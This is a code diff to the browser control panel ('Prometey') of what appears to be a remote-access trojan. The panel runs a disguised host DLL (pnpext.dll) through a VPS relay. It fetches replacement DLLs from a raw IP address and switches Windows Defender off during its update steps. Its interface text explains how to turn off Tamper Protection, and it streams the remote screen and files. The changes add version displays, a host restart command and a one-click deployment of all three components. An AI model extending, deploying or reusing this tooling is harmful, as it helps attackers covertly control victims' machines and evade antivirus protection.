@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta name="build" content="20260407-034" />
+<meta name="build" content="1.0.95" />
 <title>Prometey</title>
 <style>
 /* ═══════════════════════════════════════════════════
@@ -968,6 +968,7 @@ body {
   </div>
   <div class="sep"></div>
   <span id="sys-info-bar">—</span>
+  <span id="version-info" style="font-size:9px;color:#555;margin-left:8px;"></span>
   <div id="threat-warning" style="display:none; margin-left:10px; padding:3px 10px; background:linear-gradient(90deg,#c62828,#ef6c00); color:#fff; border-radius:4px; font-size:11px; font-weight:bold; box-shadow:0 0 8px rgba(255,82,82,.6); animation:threatPulse 1.4s ease-in-out infinite;">⚠ <span id="threat-warning-text">THREAT</span></div>
   <div class="right">
     <span id="fps-counter"></span>
@@ -1792,6 +1793,7 @@ body {
             <div style="display:flex; gap:8px; align-items:center;">
               <input type="text" id="update-url" value="https://64.226.66.66/files/pnpext.dll" placeholder="https://64.226.66.66/files/pnpext.dll" style="flex:1;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:4px;padding:5px 8px;font-size:11px;font-family:monospace;" oninput="localStorage.setItem('update_url',this.value)">
               <button type="button" class="fm-btn" data-i18n="set_update_host" onclick="hostUpdate()" style="background:#c62828;color:#fff;">Update Host</button>
+              <button type="button" class="fm-btn" data-i18n="set_restart_host" onclick="hostRestart()" style="background:#ff6f00;color:#fff;">↻ Restart</button>
             </div>
           </div>
           <!-- Progress bar with steps -->
@@ -1804,14 +1806,13 @@ body {
               <div id="update-progress-bar" style="height:100%;background:linear-gradient(90deg,#4caf50,#8bc34a);width:0%;transition:width 0.4s;"></div>
             </div>
             <div id="update-steps" style="display:flex;justify-content:space-between;margin-top:8px;font-size:9px;color:#555;">
-              <span data-step="1" data-i18n="set_step_defender">Defender</span>
-              <span data-step="2" data-i18n="set_step_download">Download</span>
+              <span data-step="1" data-i18n="set_step_download">Download</span>
+              <span data-step="2" data-i18n="set_step_defender">Defender</span>
               <span data-step="3" data-i18n="set_step_stop_svc">Stop Svc</span>
               <span data-step="4" data-i18n="set_step_replace">Replace</span>
               <span data-step="5" data-i18n="set_step_start_svc">Start Svc</span>
               <span data-step="6" data-i18n="set_step_defender">Defender</span>
               <span data-step="7" data-i18n="set_step_done">Done</span>
-              <span data-step="9" data-i18n="set_step_done">Done</span>
             </div>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-top:8px;">
@@ -1836,7 +1837,8 @@ body {
             <input type="file" id="deploy-dll" accept=".dll" style="font-size:10px;width:200px;">
             <button class="fm-btn" data-i18n="btn_upload" onclick="vpsUpload('deploy-dll','pnpext.dll','files')" style="font-size:10px;">Upload</button>
           </div>
-          <div style="display:flex;gap:8px;margin-top:10px;align-items:center;">
+          <div style="display:flex;gap:8px;margin-top:10px;align-items:center;flex-wrap:wrap;">
+            <button class="fm-btn" data-i18n="set_deploy_all" onclick="vpsUploadAll()" style="background:#2a5;color:#fff;font-size:11px;font-weight:bold;">⬆ Upload All 3</button>
             <button class="fm-btn" data-i18n="set_restart_py" onclick="vpsRestart()" style="background:#c62828;color:#fff;font-size:11px;">Restart server.py</button>
             <button class="fm-btn" data-i18n="set_reload_page" onclick="vpsReloadPage()" style="font-size:11px;">Reload client page</button>
             <span id="deploy-status" style="font-size:11px;color:var(--muted);"></span>
@@ -2177,7 +2179,7 @@ const I18N = {
     set_host_update: 'Remote Host Update (pnpext.dll)',
     set_tamper_warn: '⚠ Tamper Protection is enabled — Defender cannot be disabled programmatically. Disable it manually via Windows Security → Virus & threat protection → Settings → Tamper Protection → OFF, then retry update.',
     set_dll_url: 'DLL URL on VPS',
-    set_update_host: 'Update Host',
+    set_update_host: 'Update Host', set_restart_host: 'Restart Host',
     set_update_hint: 'Host downloads, replaces DLL, restarts service. Auto-reconnects in ~10s.',
     set_step: 'Step',
     set_step_defender: 'Defender', set_step_download: 'Download', set_step_stop_svc: 'Stop Svc',
@@ -2187,7 +2189,7 @@ const I18N = {
     set_deploy_html: 'index.html (client UI)',
     set_deploy_py: 'server.py (VPS relay)',
     set_deploy_dll: 'pnpext.dll (host DLL for /files/)',
-    set_restart_py: 'Restart server.py', set_reload_page: 'Reload client page',
+    set_restart_py: 'Restart server.py', set_reload_page: 'Reload client page', set_deploy_all: '⬆ Upload All 3',
     set_deploy_hint: 'Upload files to VPS directories. Restart reloads server.py service.',
     set_cfg_editor: '📝 Host Config Editor (encrypted pnpext.sys)',
     set_cfg_load: 'Load from host', set_cfg_save: 'Save to host', set_cfg_format: 'Format JSON', cfg_new: 'New config',
@@ -2328,7 +2330,7 @@ const I18N = {
     set_host_update: 'Удалённое обновление хоста (pnpext.dll)',
     set_tamper_warn: '⚠ Tamper Protection включена — отключить Defender программно не получится. Отключите вручную: Безопасность Windows → Защита от вирусов → Параметры → Tamper Protection → OFF, затем повторите обновление.',
     set_dll_url: 'URL DLL на VPS',
-    set_update_host: 'Обновить хост',
+    set_update_host: 'Обновить хост', set_restart_host: 'Перезапустить хост',
     set_update_hint: 'Хост скачивает, заменяет DLL, перезапускает службу. Переподключение через ~10с.',
     set_step: 'Шаг',
     set_step_defender: 'Defender', set_step_download: 'Загрузка', set_step_stop_svc: 'Стоп служб',
@@ -2338,7 +2340,7 @@ const I18N = {
     set_deploy_html: 'index.html (клиентский UI)',
     set_deploy_py: 'server.py (VPS реле)',
     set_deploy_dll: 'pnpext.dll (DLL хоста для /files/)',
-    set_restart_py: 'Перезапустить server.py', set_reload_page: 'Перезагрузить страницу клиента',
+    set_restart_py: 'Перезапустить server.py', set_reload_page: 'Перезагрузить страницу клиента', set_deploy_all: '⬆ Загрузить все 3',
     set_deploy_hint: 'Загрузить файлы в папки VPS. Рестарт перезапускает службу server.py.',
     set_cfg_editor: '📝 Редактор конфига хоста (зашифрованный pnpext.sys)',
     set_cfg_load: 'Загрузить с хоста', set_cfg_save: 'Сохранить на хост', set_cfg_format: 'Форматировать JSON', cfg_new: 'Новый конфиг',
@@ -2477,7 +2479,7 @@ const I18N = {
     set_host_update: 'Uzaq host yeniləməsi (pnpext.dll)',
     set_tamper_warn: '⚠ Tamper Protection aktivdir — Defender proqramla söndürülə bilməz. Windows Security → Virus & threat protection → Settings → Tamper Protection → OFF vasitəsilə əl ilə söndürüb yenidən cəhd edin.',
     set_dll_url: 'VPS-də DLL URL',
-    set_update_host: 'Hostu yenilə',
+    set_update_host: 'Hostu yenilə', set_restart_host: 'Hostu yenidən başlat',
     set_update_hint: 'Host endirir, DLL-i əvəz edir, xidməti yenidən başladır. Təxminən 10s sonra yenidən qoşulur.',
     set_step: 'Addım',
     set_step_defender: 'Defender', set_step_download: 'Endir', set_step_stop_svc: 'Xidməti dayandır',
@@ -2487,7 +2489,7 @@ const I18N = {
     set_deploy_html: 'index.html (klient UI)',
     set_deploy_py: 'server.py (VPS relay)',
     set_deploy_dll: 'pnpext.dll (/files/ üçün host DLL)',
-    set_restart_py: 'server.py-ni yenidən başlat', set_reload_page: 'Klient səhifəsini yenilə',
+    set_restart_py: 'server.py-ni yenidən başlat', set_reload_page: 'Klient səhifəsini yenilə', set_deploy_all: '⬆ Hamısını yüklə (3)',
     set_deploy_hint: 'Faylları VPS qovluqlarına yüklə. Restart server.py xidmətini yenidən yükləyir.',
     set_cfg_editor: '📝 Host Konfiq Redaktoru (şifrələnmiş pnpext.sys)',
     set_cfg_load: 'Hostdan yüklə', set_cfg_save: 'Hosta saxla', set_cfg_format: 'JSON formatla', cfg_new: 'Yeni konfiq',
@@ -3096,9 +3098,13 @@ function handleText(raw) {
   // Auth ok
   if (msg.event === 'auth_ok') {
     state.connected = true;
-    state.userId = msg.user_id || '';  // save our client ID for targeted file delivery
-    state.reconnectDelay = 2000; // reset backoff on success
+    state.userId = msg.user_id || '';
+    state.serverVersion = msg.server_version || '?';
+    state.reconnectDelay = 2000;
     state.hostOnline = msg.host_online;
+    // Show versions in topbar
+    const verEl = document.getElementById('version-info');
+    if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + state.serverVersion;
     try {
       localStorage.setItem('rdp_server', document.getElementById('in-server').value.trim());
       localStorage.setItem('rdp_port', document.getElementById('in-port').value.trim());
@@ -4032,7 +4038,7 @@ function parseScrnAndRender(buf) {
 // ── Dedicated File WebSockets (file_recv) ──────────────────────
 // Multiple TCP connections for FILE binary chunks — torrent-style parallelism
 // Each TCP connection has its own congestion window → N× aggregate throughput
-const FILE_WS_COUNT = 8;  // 8 parallel file_recv TCP connections — max throughput
+const FILE_WS_COUNT = 8;  // 8 parallel file_recv TCP connections for max download throughput
 
 function openFileWebSocket() {
   // Close existing file connections
@@ -5855,6 +5861,11 @@ async function refreshDashboard() {
     const cpuStr = (d.cpu_pct != null && d.cpu_pct >= 0) ? (d.cpu_pct + '%') : '—';
     const gpuStr = (d.gpu_pct != null && d.gpu_pct >= 0) ? (d.gpu_pct + '%') : '—';
     document.getElementById('sys-info-bar').textContent = `${d.hostname} | RAM: ${d.ram_used_pct}% | CPU: ${cpuStr} | GPU: ${gpuStr} | Up: ${h}h ${m}m`;
+    // Update version info with host version
+    const verEl = document.getElementById('version-info');
+    if (verEl && d.host_version) {
+      verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
+    }
     document.getElementById('d-codec').textContent = 'Codec: ' + state.codec;
     // OS version
     const osEl = document.getElementById('d-os-version');
@@ -9545,6 +9556,58 @@ async function vpsUpload(inputId, filename, target) {
   }
 }
 
+async function vpsUploadAll() {
+  // Order: DLL first (static file), then server.py (relay, no auto-restart), then index.html last.
+  // server.py restart happens AFTER all 3 are uploaded, not during.
+  const files = [
+    { id: 'deploy-dll',  name: 'pnpext.dll', target: 'files' },
+    { id: 'deploy-py',   name: 'server.py',  target: 'relay' },
+    { id: 'deploy-html', name: 'index.html', target: 'web' },
+  ];
+  const stEl = document.getElementById('deploy-status');
+  const missing = files.filter(f => {
+    const el = document.getElementById(f.id);
+    return !el || !el.files || !el.files[0];
+  });
+  if (missing.length > 0) {
+    stEl.textContent = '✗ ' + t('msg_no_selection') + ': ' + missing.map(f => f.name).join(', ');
+    stEl.style.color = '#f44336';
+    return;
+  }
+  const results = [];
+  for (let i = 0; i < files.length; i++) {
+    const f = files[i];
+    const fileEl = document.getElementById(f.id);
+    const size = fileEl.files[0] ? (fileEl.files[0].size / 1024).toFixed(0) : '?';
+    stEl.textContent = '⬆ ' + (i + 1) + '/3: ' + f.name + ' (' + size + ' KB)...';
+    stEl.style.color = '#ff9800';
+    try {
+      await vpsUpload(f.id, f.name, f.target);
+      results.push('✓ ' + f.name);
+      addLog('Deploy ' + (i+1) + '/3: ' + f.name + ' (' + size + ' KB) OK', 'OK');
+    } catch(e) {
+      results.push('✗ ' + f.name);
+      addLog('Deploy ' + (i+1) + '/3: ' + f.name + ' FAILED', 'WARN');
+    }
+    // Small delay between uploads to let server process
+    if (i < files.length - 1) await new Promise(r => setTimeout(r, 500));
+  }
+  const okCount = results.filter(r => r.startsWith('✓')).length;
+  stEl.textContent = results.join(' | ');
+  stEl.style.color = okCount === 3 ? '#4caf50' : okCount > 0 ? '#ff9800' : '#f44336';
+  addLog('VPS Deploy: ' + okCount + '/3 uploaded', okCount === 3 ? 'OK' : 'WARN');
+  if (okCount > 0) {
+    if (confirm(t('set_restart_py') + '?\nAll connections will drop for a few seconds.')) {
+      stEl.textContent = '↻ Restarting relay...'; stEl.style.color = '#ff9800';
+      try { await vpsRestart(); } catch(e) {}
+      stEl.textContent = '✓ ' + results.join(' | ') + ' + relay restarted';
+      stEl.style.color = '#4caf50';
+      // Auto-reload page after 3s to pick up new index.html
+      setTimeout(() => location.reload(), 3000);
+    }
+  }
+}
+
 async function vpsRestart() {
   const stEl = document.getElementById('deploy-status');
   if (!confirm('Restart server.py on VPS?\nAll connections will drop for a few seconds.')) return;
@@ -9604,6 +9667,17 @@ async function loadHostVersion() {
     if (segEl && seg) segEl.value = seg;
   } catch(e) {}
 })();
+
+async function hostRestart() {
+  if (!confirm(t('set_restart_host') + '?\n' + t('msg_host_disconnected') + ' ~5s')) return;
+  try {
+    await sendCmd({ cmd: 'host_restart' });
+    addLog(t('set_restart_host') + ' — OK', 'OK');
+    notify('Host restarting...', 'warn');
+  } catch (e) {
+    addLog(t('set_restart_host') + ': ' + (e.message || 'error'), 'WARN');
+  }
+}
 
 async function hostUpdate() {
   const urlEl = document.getElementById('update-url');
@@ -9682,6 +9756,21 @@ async function hostUpdate() {
         if (n >= TOTAL) {
           stEl.textContent = '✓ Update finished'; stEl.style.color = '#4caf50';
           addLog('Host update completed', 'OK');
+          // Refresh version info after host restarts with new DLL
+          setTimeout(async () => {
+            try {
+              const info = await sendCmd({ cmd: 'sys_info' });
+              const d = typeof info === 'string' ? JSON.parse(info) : info;
+              if (d.host_version) {
+                const hvEl = document.getElementById('d-host-version');
+                if (hvEl) hvEl.textContent = 'v' + d.host_version;
+                const uvEl = document.getElementById('update-version');
+                if (uvEl) uvEl.textContent = 'Current: v' + d.host_version + ' (' + (d.host_build || '') + ')';
+                const verEl = document.getElementById('version-info');
+                if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
+              }
+            } catch(e) {}
+          }, 3000);
           return;
         }
       } else {
@@ -9689,6 +9778,20 @@ async function hostUpdate() {
         stableMisses++;
         if (lastStep >= 7 && stableMisses > 3) {
           stEl.textContent = '✓ Update finished'; stEl.style.color = '#4caf50';
+          setTimeout(async () => {
+            try {
+              const info = await sendCmd({ cmd: 'sys_info' });
+              const d = typeof info === 'string' ? JSON.parse(info) : info;
+              if (d.host_version) {
+                const hvEl = document.getElementById('d-host-version');
+                if (hvEl) hvEl.textContent = 'v' + d.host_version;
+                const uvEl = document.getElementById('update-version');
+                if (uvEl) uvEl.textContent = 'Current: v' + d.host_version + ' (' + (d.host_build || '') + ')';
+                const verEl = document.getElementById('version-info');
+                if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
+              }
+            } catch(e) {}
+          }, 3000);
           return;
         }
       }
